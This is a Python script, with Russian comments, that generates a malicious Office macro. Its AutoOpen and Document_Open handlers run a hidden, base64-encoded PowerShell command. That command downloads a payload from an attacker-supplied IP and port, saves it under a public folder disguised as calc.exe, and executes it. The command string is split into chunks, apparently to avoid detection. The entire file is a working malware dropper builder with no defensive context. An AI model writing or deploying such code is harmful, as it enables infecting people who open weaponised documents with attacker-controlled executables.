import base64
import argparse

def main():
    parser = argparse.ArgumentParser(description='Generate malicious Office macro')
    parser.add_argument('--ip', required=True, help='Attacker IP address')
    parser.add_argument('--port', required=True, help='Attacker port')
    parser.add_argument('--payload', required=True, help='Payload file name')
    parser.add_argument('--upload-to', help='Path to save payload', default='C:\\Users\\Public\\Documents\\calc.exe')
    
    args = parser.parse_args()

    # Формируем PowerShell команду с переданными параметрами
    ps_command = f"""
$client = New-Object System.Net.WebClient
$client.DownloadFile('http://{args.ip}:{args.port}/{args.payload}', '{args.upload_to}')
Start-Process '{args.upload_to}' -WindowStyle Hidden
"""

    # Кодирование payload с учетом UTF-16 Little Endian (без BOM)
    encoded_script = base64.b64encode(ps_command.encode('utf-16le')).decode()
    
    # Формируем командную строку для PowerShell
    cmdline = f"powershell.exe -nop -w hidden -e {encoded_script}"
    
    # Генерация макроса с правильным разбиением команды
    macro_template = """Sub AutoOpen()
    AutoOpenMacro
End Sub

Sub Document_Open()
    AutoOpenMacro
End Sub

Sub AutoOpenMacro()
    Dim Str As String
"""
    
    # Разбиваем командную строку на части по 50 символов
    chunks = [cmdline[i:i+50] for i in range(0, len(cmdline), 50)]
    
    for chunk in chunks:
        macro_template += f'    Str = Str + "{chunk}"\n'
    
    macro_template += """    CreateObject("Wscript.Shell").Run Str
End Sub
"""

    print(macro_template)

if __name__ == "__main__":
    main()
